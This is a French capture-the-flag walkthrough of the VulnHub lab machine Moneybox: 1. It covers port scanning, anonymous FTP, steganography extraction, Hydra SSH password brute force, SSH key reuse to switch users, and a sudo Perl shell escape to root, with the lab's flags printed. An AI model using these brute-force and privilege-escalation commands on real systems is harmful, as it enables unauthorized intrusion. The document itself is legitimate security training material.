---
title: "CTF Moneybox: 1"
date: 2021-05-09
tags: ["Pentest", "CTF"]
download: https://www.vulnhub.com/entry/moneybox-1,653
---

## Avant propos

Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.  
Ce CTF a été réalisé avec une machine attaquante **Kali 2021.1** (`lsb_release -r`).

## Enumération

On récupère l'adresse IP de la machine distante avec **Netdiscover** `sudo netdiscover`.  
Avant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite `export IP=192.168.1.45`.  
Puis on créé un dossier dédié à ce CTF `cd Documents/ctf && mkdir moneybox1 && cd moneybox1`.  
On lance **Nmap** pour scanner les ports de la machine distante.

```bash
$ nmap -A -p- $IP -oN nmap.txt
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0         1093656 Feb 26 09:48 trytofind.jpg
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.38
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 1e:30:ce:72:81:e0:a2:3d:5c:28:88:8b:12:ac:fa:ac (RSA)
|   256 01:9d:fa:fb:f2:06:37:c0:12:fc:01:8b:24:8f:53:ae (ECDSA)
|_  256 2f:34:b3:d0:74:b4:7f:8d:17:d2:37:b1:2e:32:f7:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: MoneyBox
```

On a un serveur **FTP** sur le port **21**, un serveur **SSH** sur le port **22** et un serveur **Apache 2** sur le **80**.

Astuce vous pouvez ajouter le domaine _MoneyBox.home_ dans le fichier `/etc/hosts` avec **Vim** (ou un autre éditeur de texte).

```bash
$ sudo vim /etc/hosts
192.168.1.45 MoneyBox.home
```

Commençons par énumérer le serveur **FTP** afin de récupérer le fichier "trytofind.jpg".

```bash
$ ftp
ftp> open $IP
Connected to 192.168.1.45.
220 (vsFTPd 3.0.3)
Name (192.168.1.45:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Feb 26 09:51 .
drwxr-xr-x    2 0        0            4096 Feb 26 09:51 ..
-rw-r--r--    1 0        0         1093656 Feb 26 09:48 trytofind.jpg
226 Directory send OK.
ftp> get trytofind.jpg
ftp> exit
```

La photo récupérée représente un chat en hoodie tapant sur un clavier d'un pc portable. On check la présence d'informations dans les données **Exif** `exiftool trytofind.jpg pas d'exif` sans succès.  
On poursuit avec **Nikto** pour scanner la sécurité du serveur **Apache**.

```bash
$ nikto -h http://$IP
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 26d, size: 5bc3f995481cd, mtime: gzip
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD
+ OSVDB-3233: /icons/README: Apache default file found.
```

Rien de croustillant. Scannons les pages avec **Gobuster**.

```bash
$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.xml,.js
/index.html           (Status: 200) [Size: 621]
/blogs                (Status: 301) [Size: 312] [--> http://192.168.1.45/blogs/]
```

La page [/blogs](http://MoneyBox.home/blogs) retourne un chemin dans le code source (en scrollant) `<!--the hint is the another secret directory is S3cr3t-T3xt-->`. La page [/S3cr3t-T3xt](http://moneybox.home/S3cr3t-T3xt) retourne un code dans le code source (en scrollant) `<!..Secret Key 3xtr4ctd4t4 >`.

Testons la présence d'un fichier dans l'image récupérée du serveur **FTP** avec l'outil **Steghide**.

```bash
$ steghide --extract -sf trytofind.jpg
Entrez la passphrase: 3xtr4ctd4t4
�criture des donn�es extraites dans "data.txt".
```

Dans le fichier "data.txt", on apprend la présence d'un éventuel utilisateur "renu".

```bash
$ cat data.txt              
Hello.....  renu

      I tell you something Important.Your Password is too Week So Change Your Password
Don't Underestimate it.......
```

Avec cette information, tentons un brute force sur le serveur **SSH** avec **Hydra**.

```bash
$ hydra -l renu -P /usr/share/wordlists/rockyou.txt $IP -t 4 -V ssh
[22][ssh] host: 192.168.1.45   login: renu   password: 987654321
```

Après quelques minutes, **Hydra** trouve le mot de passe de cet utilisateur : "987654321".

## Pénétration

On se connecte en **SSH** avec l'utilisateur "renu".

```bash
$ ssh renu@$IP
[STATUS] 4781466.33 tries/min, 14344399 tries in 00:03h, 1 to do in 00:01h, 1 active
renu@192.168.1.45's password: 987654321
```

On trouve facilement le flag user présent dans le fichier "user1.txt".

```bash
$ cat user1.txt
Yes...!
You Got it User1 Flag

 ==> us3r1{F14g:0ku74tbd3777y4}
```

## Escalation

L'utilisateur "renu" n'a pas accès à **sudo** mais il y a une autre utilisatrice... "lily".

```bash
$ ls -la /home
drwxr-xr-x  4 lily lily 4096 Feb 26 09:06 lily
```

Dans son dossier on trouve un second flag dans le fichier "user2.txt".

```bash
$ cat /home/lily/user2.txt
Yeah.....
You Got a User2 Flag

==> us3r{F14g:tr5827r5wu6nklao}
```

La clef de l'utilisateur "renu" apparait dans le fichier "authorized_keys" de "lily".

```bash
$ cat /home/lily/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRIE9tEEbTL0A+7n+od9tCjASYAWY0XBqcqzyqb2qsNsJnBm8cBMCBNSktugtos9HY9hzSInkOzDn3RitZJXuemXCasOsM6gBctu5GDuL882dFgz962O9TvdF7JJm82eIiVrsS8YCVQq43migWs6HXJu+BNrVbcf+xq36biziQaVBy+vGbiCPpN0JTrtG449NdNZcl0FDmlm2Y6nlH42zM5hCC0HQJiBymc/I37G09VtUsaCpjiKaxZanglyb2+WLSxmJfr+EhGnWOpQv91hexXd7IdlK6hhUOff5yNxlvIVzG2VEbugtJXukMSLWk2FhnEdDLqCCHXY+1V+XEB9F3 renu@debian
```

Donc on peut se connecter en **SSH** sur le compte de l'utilisatrice "lily" `ssh lily@localhost`.  
Utilisatrice qui a le droit d'exécuter **sudo**.

```bash
$ sudo -l
User lily may run the following commands on MoneyBox:
    (ALL : ALL) NOPASSWD: /usr/bin/perl
```

On peut exécuter du **Perl** en tant que **sudo** avec ce compte. Commande ci-dessous que l'on récupère sur [GTFOBins](https://gtfobins.github.io/gtfobins/perl/#sudo).

```bash
$ sudo perl -e 'exec "/bin/sh";'
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ id
uid=0(root) gid=0(root) groups=0(root)
```

Désormais root, on peut accèder au contenu du dernier flag.

```bash
$ cat /root/.root.txt
H4ckth3p14n3t
```
